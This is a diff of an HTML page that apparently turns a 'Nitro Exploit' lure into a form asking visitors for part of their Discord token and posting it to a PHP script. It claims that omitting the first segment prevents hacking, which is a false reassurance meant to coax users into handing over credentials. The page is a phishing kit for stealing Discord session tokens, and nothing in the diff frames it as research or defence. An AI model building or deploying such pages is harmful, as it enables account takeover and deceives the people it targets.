@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Nitro Exploit</title>
+<title>Enter Discord Token</title>
 <style>
   body {
     background-color: black;
@@ -18,17 +18,7 @@
     justify-content: center;
     align-items: center;
     height: 100vh;
-  }
-  .btn {
-    background-color: green;
-    color: white;
-    padding: 10px 20px;
-    text-decoration: none;
-    border-radius: 5px;
-    font-size: 18px;
-  }
-  .input-container {
-    margin-top: 20px;
+    flex-direction: column;
   }
   .input-label {
     font-size: 18px;
@@ -40,13 +30,30 @@
     border-radius: 5px;
     border: 1px solid #ccc;
     width: 300px;
+    margin-bottom: 20px;
+  }
+  .submit-btn {
+    background-color: green;
+    color: white;
+    padding: 10px 20px;
+    text-decoration: none;
+    border-radius: 5px;
+    font-size: 18px;
   }
 </style>
 </head>
 <body>
 <div class="container">
-  <a href="enter.html" class="btn">Start Now</a>
+  <div>
+    <p class="input-label">Please enter the last part of your Discord token.</p>
+    <p class="input-label">It will look like this:</p>
+    <p class="input-label">XXXXXXXXXXXXXXXXXXXXXXXX.OOOOO.OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO</p>
+    <p class="input-label">Do not enter the part marked X, but only enter the part marked O. (To prevent hacking)</p>
+  </div>
+  <form action="submit-action.php" method="POST">
+    <input type="text" class="input-field" name="token" placeholder="Enter the OOOOO.OOOOOO part">
+    <button type="submit" class="submit-btn">Submit</button>
+  </form>
 </div>
 </body>
 </html>
-
